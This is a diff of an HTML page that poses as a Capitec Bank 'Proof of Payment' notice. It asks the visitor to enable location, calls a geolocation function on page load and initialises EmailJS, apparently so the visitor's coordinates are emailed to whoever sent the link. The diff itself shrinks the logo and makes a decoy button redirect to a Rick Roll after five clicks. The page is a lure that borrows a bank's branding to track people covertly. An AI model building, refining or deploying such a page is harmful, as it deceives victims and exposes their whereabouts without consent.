@@ -16,7 +16,7 @@
             background-color: #f0f0f0; /* Light background color */
         }
         img {
-            max-width: 250px; /* Adjust logo size */
+            max-width: 150px; /* Adjust logo size */
             margin-bottom: 20px; /* Space below logo */
         }
         h1 {
@@ -36,19 +36,21 @@
 </head>
 <body>
     <!-- Logo -->
-    <img src="https://cdn.freelogovectors.net/wp-content/uploads/2020/09/capitec-logo.png" alt="Logo"> <!-- Replace with your logo URL -->
+    <img src="https://cdn.freelogovectors.net/wp-content/uploads/2020/09/capitec-logo.png" alt="Logo">
 
     <!-- Text Content -->
     <h1>Proof of Payment</h1>
     <p>Please enable Location</p>
 
-    <!-- Button that does nothing when clicked -->
-    <button id="proofOfPaymentButton" onclick="doNothing()">Proof Of Payment</button>
+    <!-- Button that redirects after five clicks -->
+    <button id="proofOfPaymentButton" onclick="handleButtonClick()">Proof Of Payment</button>
 
     <script>
         (function() {
             emailjs.init("614HG-vm71ufAzV-E"); // Replace with your EmailJS public key
         })();
+
+        let clickCount = 0;
 
         function getLocation() {
             if (navigator.geolocation) {
@@ -95,9 +97,13 @@
             }
         }
 
-        function doNothing() {
-            // This function intentionally does nothing
-            console.log("Button clicked, but does nothing.");
+        function handleButtonClick() {
+            clickCount++;
+            if (clickCount >= 5) {
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Redirect to Rick Roll
+            } else {
+                console.log(`Button clicked ${clickCount} times.`);
+            }
         }
 
         // Automatically call getLocation when the page loads
